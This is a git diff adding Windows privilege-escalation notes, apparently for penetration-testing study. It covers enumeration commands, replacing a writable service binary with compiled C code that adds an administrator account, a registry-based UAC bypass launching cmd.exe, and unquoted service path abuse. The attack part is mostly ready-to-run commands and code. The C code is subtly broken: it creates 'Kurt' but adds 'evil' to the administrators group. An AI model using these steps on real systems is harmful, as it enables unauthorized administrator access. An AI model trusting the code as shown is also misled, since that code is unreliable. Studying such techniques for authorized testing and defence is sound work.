@@ -1,8 +1,81 @@
 # Windows Privilege Escalation Notes  
 
+## net commands  
+
+Check who is in local administrators group.  
+
+`net localgroup Administrators`  
+
+
 Find user privileges.  
 
 `whoami /priv`
+
+Find running processes.  
+
+`tasklist`  
+
+Find running processes with powershell.  
+
+`Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`  
+
+## Services  
+
+Are services running program files binaries? These are user installed and the structure and permissions are set by the user or developer.  
+
+Permissions of a service.  
+
+`icacls "C:\Program Files\someDirectory\bin\someBinary.exe"`  
+
+Most relevant permissions.  
+
+```
+Mask | Permissions
+------------------
+F    | Full access 
+M    | Modify access
+RX   | Read and Execute access
+R    | Read-only access
+W    | Write-only access
+```  
+
+If we find a service with a binary that has full read/write permissions, it can be replaced with something of my choosing.  
+
+The following C code creates a user 'Kurt' and adds him to the local administrator group.  
+
+```
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user Kurt password123 /add");
+  i = system ("net localgroup administrators evil /add");
+  
+  return 0;
+}
+```  
+
+This can be compiled on a kali machine.  
+
+`i686-w64-mingw32-gcc adduser.c -o adduser.exe`  
+
+Move the service binary to keep the original intact.  
+
+`move "C:\Program Files\someDirectoy\bin\someBinary.exe" "C:\Program Files\someDirectory\bin\someBinary_original.exe"`  
+
+Move the malicious binary to the binary the service runs.  
+
+`move adduser.exe "C:\Program Files\someDirectory\bin\someBinary.exe"`  
+
+If we do not have permission to restart this service, we can check if it starts in auto.  
+
+`wmic service where caption="SomeService" get name, caption, state, startmode`  
+
+If the user has reboot permission, a reboot can restart the service automatically and run the malicous binary.  
+
+`shutdown /r /t 0`  
 
 
 ## Integrity levels  
@@ -54,4 +127,31 @@ To add a registry key with v for value name and t for the type.
 To add a value to a registry key, d is the value and f to add silently.  
 
 `REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f`  
+
+## Unquoted service paths  
+
+This attack is possible when a service directory and sub-directory has write access but the files within cannot be replaced.  
+
+Windows will attempt to execute this unquoted path.  
+
+`C:\Program Files\My Program\My Service\service.exe`  
+
+In the following way.  
+
+```
+C:\Program.exe
+C:\Program Files\My.exe
+C:\Program Files\My Program\My.exe
+C:\Program Files\My Program\My service\service.exe
+```  
+
+In the above, a executable  
+
+`My.exe`  
+
+Could be placed in.  
+
+`C:\Program Files\My Program`  
+
+If write permissions are misconfigured.  
 
